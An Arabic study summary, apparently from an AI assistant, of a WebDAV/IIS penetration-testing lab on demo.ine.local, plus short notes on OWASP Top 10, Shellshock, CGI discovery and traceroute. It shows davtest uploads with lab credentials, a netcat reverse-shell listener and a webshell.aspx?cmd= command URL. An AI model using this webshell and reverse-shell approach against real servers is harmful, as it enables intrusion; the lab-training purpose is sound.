# ملخص: WebDAV / IIS / davtest / cadaver — حالات اختبارية (demo.ine.local)



---

## 1 — مقتطفات المخرجات (مأخوذة من الصور بالترتيب)

### صورة 1 — فحص Nmap على المنفذ 80

```bash
nmap --script http-enum -sV -p 80 demo.ine.local
```

---

### صورة 2 — إعداد lister لـ netcat

```bash
# (root@INC) -[~]
# nc -nvlp 2222
listening on [any] 2222 ...
```

> ملاحظة: سطر `nc -nvlp 2222` يظهر أن المستخدم أعدّ مستمعًا على المنفذ 2222 لالتقاط اتصالات واردة (listener).

---

### صورة 3 — ناتج أداة `davtest` مع مصادقة

```bash
# (Root@INE) -[~]
# davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

********************************************************
Testing DAV connection
OPEN
SUCCEED: http://demo.ine.local/webdav
********************************************************
NOTE Random string for this session: AqOe5dckMTF
********************************************************
Creating directory
MKCOL SUCCEED: Created http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF
********************************************************
Sending test files
PUT txt SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.txt
PUT pl SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.pl
PUT html SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.html
PUT jsp SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.jsp
PUT php SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.php
PUT cgi SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.cgi
PUT jhtml SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.jhtml
PUT shtml SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.shtml
PUT cfm SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.cfm
PUT asp SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.asp
PUT aspx SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.aspx
********************************************************
Checking for test file execution
EXEC txt SUCCEED: http://demo.ine.local/webdav/DavTestDir_AqOe5dckMTF/davtest_AqOe5dckMTF.txt
```

> ملاحظة مهمة: مخرجات `davtest` تُظهر أن الخدمة تقبل إنشاء مجلدات ورفع ملفات بعد المصادقة (المستخدم `bob` مع كلمة المرور المعطاة). كما تُظهر `PUT` لملفات بصيغ تنفيذية محتملة (.php, .jsp, .asp, .cgi, إلخ).

---

### صورة 4 — نموذج URL يظهر إمكانية تنفيذ أوامر عبر webshell.aspx

```
URL: http://demo.ine.local/webdav/webshell.aspx?cmd=dir+C%3A%5C
```

> هذه سلسلة URL توضح أنّه يوجد موردًا (webshell.aspx) يقبل باراميتر `cmd` وينفّذ أمرًا (مثال: `dir C:\`). هذا مؤشر قوي على أنّ الخادم يسمح بتنفيذ أوامر عن بُعد عبر واجهة الويب، إذا كانت الصلاحيات متاحة.

---

## 2 — تعريفات سريعة (مختصرات أساسية)

### WebDAV

- **WebDAV** (Web Distributed Authoring and Versioning) هو امتداد لبروتوكول HTTP يسمح بتحرير وإدارة ملفات على خوادم الويب عن بُعد (مصدر/تحرير مثل `PUT`, `MKCOL`, `DELETE`).
    
- يُستخدم عادة لرفع محتوى أو مزامنة ملفات، ويمكن أن يُفتح كمخاطرة أمنيّة إذا لم تُقيَّد صلاحياته بشكل صحيح (يسمح بالكتابة والتنفيذ).
    

### IIS

- **IIS** (Internet Information Services) هو خادم ويب من Microsoft يُشغّل تطبيقات ويب (ASP.NET, .aspx, وغيرها). يحتوي على ملحق WebDAV كخدمة إضافية.
    
- إعدادات IIS قد تسمح بتنفيذ ملفات تم رفعها (مثلاً `.aspx`) إذا وضعت داخل مجلدات تُعالجها المنصة.
    

---

## 3 — أدوات ذُكرت وشرح مختصر لكل أداة

### `davtest`

- أداة لاختبار ميزات WebDAV: التحقق من إمكانية إنشاء مجلدات (MKCOL)، رفع ملفات (PUT)، ومحاولة تنفيذ/الوصول إلى الملفات المرفوعة.
    
- خيار `-auth user:pass` يُستخدم لتزويد بيانات المصادقة (Basic/NTLM بحسب الخادم).
    
- المخرجات تُظهر نجاح/فشل كل عملية، وتدل على إمكانية استخدام WebDAV كوسيلة لرفع ملفات قابلة للتنفيذ.
    

### `cadaver` (لم يُظهر في المخرجات لكنه طُلب شرحه)

- عميل WebDAV سطري (CLI) يُمكِّنك من الاتصال لمخدمات WebDAV والتعامل مع الملفات (مثل FTP عبر بروتوكول WebDAV). يستخدم لأغراض تصفّح/رفع/حذف دون واجهة رسومية.
    

### `nc` (netcat)

- أداة شبكية عامة يمكن استخدامها لإنشاء listeners (مثل `nc -nvlp 2222`) أو لعمل اتصال من جانب العميل لاستلام shell عكسي (reverse shell). تظهر في اللقطات أنّه تم إعداد مستمع على المنفذ 2222.
    

### `nmap --script http-enum`

- فحص يعرض معلومات عن موارد HTTP المتاحة، مثل مسارات شائعة وملفات.
    
- استخدمته الصورة الأولى على `demo.ine.local:80` لاكتشاف واجهات/مجلدات ويب.
    

---

## 4 — استنتاجات فنية من المخرجات

- تم **التحقّق من وجود WebDAV فعال** على `http://demo.ine.local/webdav` باستخدام بيانات اعتماد (`bob:password_123321`).
    
- تمكّن `davtest` من **إنشاء مجلد** و**رفع مجموعة من الملفات** بصيغ متعددة (نصّيّة + صيغ تنفيذية محتملة: .php, .jsp, .asp, .aspx, .cgi, ...).
    
- تم التحقق من إمكانية الوصول إلى الملف النصّي (EXEC txt SUCCEED) — أي أنّ الخادم يعيد المحتوى أو يتعامل مع الملف بنجاح.
    
- وجود URL مثل `webshell.aspx?cmd=...` يشير لاحتمال وجود واجهة تتيح تنفيذ أوامر نظامية من خلال الويب — مؤشر خطير إذا كانت مُعرّضة لمستخدمين غير موثوقين.
    
- إعداد مستمع `nc -nvlp 2222` يظهر نية التقاط صدور اتصالات عكسية (reverse shells) — نقطةَ ذكرٍ توضح كيف قد يُستخدم رفع ملفات قابلة للتنفيذ لاستلام تحكم تفاعلي.
    

---

## 5 — مخاطر أمنية

- **رفع ملفات تنفيذية عبر WebDAV** على خادم يعالج هذه الامتدادات قد يؤدي إلى تنفيذ أوامر على الخادم (Remote Code Execution).
    
- **واجهة قبول أوامر عبر `webshell.aspx`** تمثّل خطراً مباشراً يسمح بتنفيذ أوامر النظام. حتى إن كانت المحاكاة داخل بيئة اختبار، فإن وجود مثل هذه الواجهة في بيئة إنتاجيّة يُعد ثغرة حرجة.
    
- **استغلال reverse shell** عبر ملف مرفوع سيمنح مهاجمًا وصولًا تفاعليًا للنظام (privilege escalation ممكنة لاحقًا).
    

> تصنيف مبدئي: إذا هذه الحالة على بيئة إنتاجية — مستوى الخطورة: **Critical/High**.

---

# ملخص مختصر (بـ Markdown) — OWASP10, Shellshock، CGI، وTraceroute

## 1. OWASP Top 10 (ملخّص سريع جداً)

**OWASP** = _Open Web Application Security Project_ — مشروع مفتوح المصدر يهدف لتوعية المطوّرين والباحثين بأهم مخاطر أمان تطبيقات الويب، ويصدر قوائم وإرشادات وأدوات (أشهرهم: **OWASP Top 10**).

- **A01 — Broken Access Control**: وصول غير مصرح لموارد/وظائف بسبب تحقق صلاحيات ضعيف.
    
- **A02 — Cryptographic Failures**: تشفير/حماية بيانات ضعيف أو تسرب بيانات حساسة.
    
- **A03 — Injection**: إدخال أوامر/استعلامات (SQL, OS, LDAP, ...) تؤدي لتصرف غير مقصود.
    
- **A04 — Insecure Design**: عيوب تصميمية من البداية (سياسات/تصميم يسبّب ثغرات).
    
- **A05 — Security Misconfiguration**: إعدادات سيرفر/تطبيق خاطئة (debug enabled، directory listing…).
    
- **A06 — Vulnerable/Outdated Components**: استخدام مكتبات أو خدمات قديمة تحتوي ثغرات.
    
- **A07 — Identification & Authentication Failures**: ضعف في آليات تسجيل الدخول/جلسات العمل.
    
- **A08 — Software and Data Integrity Failures**: استقبال/تنفيذ محتوى غير موثوق (مثلاً تحديثات غير موقعة).
    
- **A09 — Security Logging & Monitoring Failures**: قلة السجلات أو عدم الإنذار عند حدوث خلاّل أمني.
    
- **A10 — Server-Side Request Forgery (SSRF)**: الخادم يُجبر على طلب موارد داخلية أو خارجية ضارة.
    

> نصيحة: ابدأ دائماً بفحص A01–A03 وA05 لأنهم الأكثر شيوعاً في برامج الباونتي.

---

## 2. Shellshock — شرح مبسّط

- **ما هي؟** ثغرة في Bash اكتشفت 2014 (CVE-2014-6271 وغيرها) تسمح بتمرير أوامر إلى بيئة الشيل عبر متغيرات البيئة التي يعالجها Bash.
    
- **لماذا خطيرة؟** على خوادم تعرض متغيرات البيئة من مدخلات خارجية (مثلاً رؤوس HTTP أو CGI inputs)، يمكن تنفيذ أوامر على الخادم.
    
- **أين تظهر عادة؟** في برامج/سكريبتات CGI أو أي نقطة يمرّ فيها محتوى خارجي إلى Bash دون تدقيق.
    
- **ما المطلوب للفحص الآمن؟** التحقّق من وجود سكريبتات CGI التي تستدعي shell أو تمرر متغيرات البيئة دون تصفية.
    

---

## 3. **`User-Agent` injection** كمسار لفحص Shellshock

- **الفكرة:** بعض واجهات CGI تنقل رؤوس HTTP إلى متغيرات بيئة (مثل `HTTP_USER_AGENT`) ثم يستدعى شيل. فبتعديل `User-Agent` قد تُمرّر قيمة ضارة.
    
- **فحص آمن (مثال طلب غير مؤذي):**
    

```bash
# مثال لإرسال User-Agent مخصص (فقط لاختبار وجود المعالجة)
curl -I -A 'PENTEST-TEST-UA-2025' https://target.com/cgi-bin/example.cgi
```

- **ماذا تبحث؟** استجابات غير متوقعة في الصفحة، أخطاء داخلية 500، أو تغيّر في سلوك السكريبت بعد تغيير الـ User-Agent.
    
- **تنبيه أمان:** لا ترسل أوامر تنفيذية حقيقية أو payloads قد تؤذي النظام — في برامج باونتي، اذكر ملاحظة إن التغيير أثر على السلوك وأرفق دلائل (logs/screenshots) بدلاً من تنفيذ خبيث.
    

---

## 4. مواقع تستخدم CGI — فين تلاقيها (location of CGI)

- **مسارات شائعة:**
    
    - `/cgi-bin/`
        
    - صفحات أو ملفات بلاحقات: `.cgi`, `.pl`, `.sh`, `.py` (مش دائماً)
        
- **أين تظهر؟** قد تكون ملفات مستقلة على السيرفر، endpoints قديمة في الويب، أو خلف واجهات تحميل/نماذج (forms) تتصل ببرامج CGI.
    
- **كيفية اكتشافها عملياً:**
    
    - بحث بمسارات معروفة: `https://target.com/cgi-bin/` أو `https://target.com/cgi-bin/script.cgi`
        
    - استخدم نتائج Wayback / gau / waybackurls للعثور على مسارات 
    - **محركات البحث**:
    site:target.com inurl:cgi-bin
    site:target.com inurl:".cgi"

    - فحص استجابات السيرفر: أحياناً header أو body يبين interpreter (Perl, Python).
        
    - إجراء fuzz على مسارات شائعة (ffuf/dirb) للعثور على ملفات بلاحقات المذكورة.
        
- **هل موجودة في ملفات JS؟** لا: الـ CGI نفسها عبارة عن سكريبتات تُنفّذ على الخادم. قد تحتوي ملفات JS على استدعاءات لـ endpoints التي قد تكون CGI، لكن الكود الفعلي للـ CGI يكون على السيرفر (server-side)، ليس داخل JS على المتصفح.
    

---

## 5. `traceroute` لمعرفة الـ gateway أو مسار الشبكة

- **الغرض:** يعرض المسارات (hops) بين جهازك وخادم الهدف — يساعد في معرفة الشبكة، الـ ISP، أو إن كانت هناك شبكات داخلية تقع في الطريق.
    
- **أوامر شائعة:**
    
    - Linux/macOS:
        
        ```bash
        traceroute target.com
        ```
        
    - Windows:
        
        ```powershell
        tracert target.com
        ```
        
    - بدائل سريعة (إذا لم يتوفر traceroute):
        
        ```bash
        mtr --report target.com   # يرسم تقرير مسار وlatency
        ```
        
- **كيف تقرأ النتيجة بسرعة؟**
    
    - السطر الأول غالباً أول hop (gateway المحلي أو الراوتر).
        
    - الحقول التالية تظهر كل جهاز وسيط ووقت الاستجابة.
        
    - نجوم `* * *` تعني أن الـ hop لا يرد على ICMP/UDP probes أو محجوب.
        
- **ملاحظة قانونية:** استخدام traceroute على نطاقات مخوّلة آمن؛ لكن لا تستخدمه كجزء من هجوم أو مسح كثيف خارج نطاق الإذن.
    

---

## خاتمة سريعة / نصائح عملية

- ابدأ بـ: **إيجاد ملفات CGI** → **تبديل User-Agent** → **مراقبة السلوك/أخطاء** → **إن وجد أثر غير طبيعي، دوّن الأدلة واصرّف PoC آمن**.
    
- لا تستخدم payloads تنفيذية ضارة؛ صِف التأثير وأرفق دلائل بدلاً من تنفيذ أوامر.
    
- اربط النتائج بنقاط OWASP (مثلاً: Shellshock → A05 Security Misconfiguration أو A06 Vulnerable Components / A01 Broken Access Control حسب السياق).
    

لو عايز أحول الملخّص ده لملف Markdown جاهز للتسليم (ملف `.md`) أو أضيف أمثلة أوامر `ffuf`/`amass` مخصصة للبحث عن CGI على الهدف، أعملهاولك فوراً.